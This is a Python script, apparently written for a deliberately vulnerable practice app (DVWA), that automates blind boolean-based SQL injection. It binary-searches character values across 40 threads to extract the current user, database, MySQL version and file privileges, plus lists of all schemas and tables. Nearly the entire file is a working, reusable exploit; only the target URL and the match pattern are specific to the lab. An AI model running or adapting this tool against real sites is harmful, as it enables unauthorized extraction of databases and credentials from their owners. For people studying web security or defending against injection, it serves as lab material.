import requests
import urllib3
import sys
import  threading

# Target URL and suffix to sqli query
url = "http://192.168.1.105/vulnerabilities/sqli_blind/?id=1'and+"
suffix = "--+-&Submit=Submit"

# SQL Injection type based on inference type. Currently supporting two types
# 1- String pattern found in case of query result is true
# 2- Content-Length fixed response in case of query result is false

sqli_type = "pattern_true"
pattern = "First name: admin"

#sqli_type = "Content-Length"
content_length = "0" # length in case of false response

# Proxy settings
http_proxy = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
timeout = 15

# cookies + user agent, if required!
cookie = "PHPSESSID=ogbqfp6nev03ec0sc30cg5n0n5; security=low;"
user_agent = 'Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0'

# Headers settings
headers = {'User-Agent': user_agent, "Cookie": cookie}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Class to manage threads
class ScanningThread(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        # fetch position of character to fetch,
        # fetch char,
        # save in dictionary -> result
        while True:
            position = get_postion()
            if position == None:
                break
            c = char_at_position(query, position)
            result[position] = chr(c)
            sys.stdout.write("\rCompleted: %d%%" % ((len(result) / result_length) * 100))
            sys.stdout.flush()

#find length output of given query
def output_length(query):
    start_index = 0
    end_index = 2000
    while start_index < end_index:
        mid = start_index + int(( end_index - start_index )/2)
        action = url+"length("+query+")<" + str(mid) + suffix
        response = requests.get(action, headers=headers, allow_redirects=True,
                         proxies={"http": http_proxy, "https": https_proxy}, verify=False, timeout=timeout)

        if sqli_type == "Content-Length":
            if response.headers['Content-Length'] == content_length:
                start_index = mid + 1
            else:
                end_index = mid

        if sqli_type == "pattern_true":
            response_text = response.content.decode('utf-8', errors='ignore')

            if pattern in response_text:
                end_index = mid
            else:
                start_index = mid + 1

    return start_index - 1
# fetch character for given position
def char_at_position(query, position):
    start_index = 0
    end_index = 2000
    while start_index < end_index:
        mid = start_index + int(( end_index - start_index )/2)

        action = url + "ascii(substring(" + query + ","+str(position)+",1))<" + str(mid) + suffix
        response = requests.get(action, headers=headers, allow_redirects=True,
                         proxies={"http": http_proxy, "https": https_proxy}, verify=False, timeout=timeout)

        if sqli_type == "Content-Length":
            if response.headers['Content-Length'] == content_length:
                start_index = mid + 1
            else:
                end_index = mid

        if sqli_type == "pattern_true":
            response_text = response.content.decode('utf-8', errors='ignore')

            if pattern in response_text:
                end_index = mid
            else:
                start_index = mid + 1

    return start_index - 1

# return position to threads
def get_postion():
    global result_index
    ret = result_index
    if result_index < result_length+1:
        threadLock.acquire()

        result_index = result_index + 1

        threadLock.release()

        return ret
    return None

number_of_threads = 40

file_priv = "concat(0x3a3a,(select file_priv from mysql.user where user=user()))"
databases = "concat(0x3a3a,'databases::\n',(select(@result)from(select(@result:=''),(select(@result)from+information_schema.schemata+where+''+in(@result:=concat(@result,schema_name,'\r\n'))))a))"
tables = "concat(0x3a3a,'tables::\n',(select(@result)from(select(@result:=''),(select(@result)from+information_schema.tables+where+table_schema!='information_schema'and''in(@result:=concat(@result,table_schema,0x3a3a,table_name,'\r\n'))))a))"

queries = ["user()", "database()", "@@version", file_priv, databases, tables]
# start program
for query in queries:
    # take query from user
    threadLock = threading.Lock()

    #query = "database()" # input("sql> ")
    print("MySQL> select", query)

    # find length of output of query
    result_length = output_length(query)
    print("Output Length: ", result_length)
    if result_length == 1999:
        print("Something is wrong! Please may there is not data")
        continue

    result_index = 1

    # start threads
    result = {}
    threads = []
    for i in range(0, number_of_threads):
        threads.append(ScanningThread())

    for i in range(0, number_of_threads):
        threads[i].start()

    for i in range(0, number_of_threads):
        threads[i].join()
    # print result/output
    print()

    for i in range(1, result_length+1):
        print(result[i],end="")
    print("\n")
